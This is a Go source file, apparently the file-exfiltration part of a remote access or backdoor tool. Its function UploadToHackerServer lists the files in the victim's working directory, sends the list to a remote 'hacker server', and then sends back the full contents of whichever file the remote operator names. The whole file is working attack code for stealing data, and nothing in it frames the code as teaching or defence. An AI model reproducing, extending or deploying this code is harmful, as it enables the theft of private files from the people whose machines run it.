package upload

import (
	"bufio"
	"encoding/gob"
	"fmt"
	"net"
	"os"
	"strings"
)

type FilesList struct {
	Files []string
}

type Data struct {
	FileName    string
	FileSize    int
	FileContent []byte
}

func ReadFileContents(fileName string) ([]byte, error) {
	file, err := os.Open(fileName)

	if err != nil {
		fmt.Println("[+] Unable to open file")
		return nil, err
	}

	defer file.Close()

	stats, _ := file.Stat()
	FileSize := stats.Size()

	bytes := make([]byte, FileSize)

	buffer := bufio.NewReader(file)

	_, err = buffer.Read(bytes)

	return bytes, err
}

func UploadToHackerServer(connection net.Conn) (err error) {

	// get a list of files in pwd

	var files []string
	filesArr, _ := os.ReadDir(".")

	for index, file := range filesArr {
		info, _ := file.Info()

		if info.Mode().IsRegular() {
			files = append(files, file.Name())
			fmt.Printf("\t %d \t %s\n", index, file.Name())
		}
	}

	files_list := &FilesList{Files: files}

	enc := gob.NewEncoder(connection)
	_ = enc.Encode(files_list) //handle error

	reader := bufio.NewReader(connection)
	fileName2download_raw, _ := reader.ReadString('\n')

	fileName2download := strings.TrimSuffix(fileName2download_raw, "\n")

	contents, _ := ReadFileContents(fileName2download)

	fs := &Data{
		FileName:    fileName2download,
		FileSize:    len(contents),
		FileContent: contents,
	}

	encoder := gob.NewEncoder(connection)

	err = encoder.Encode(fs)

	return
}
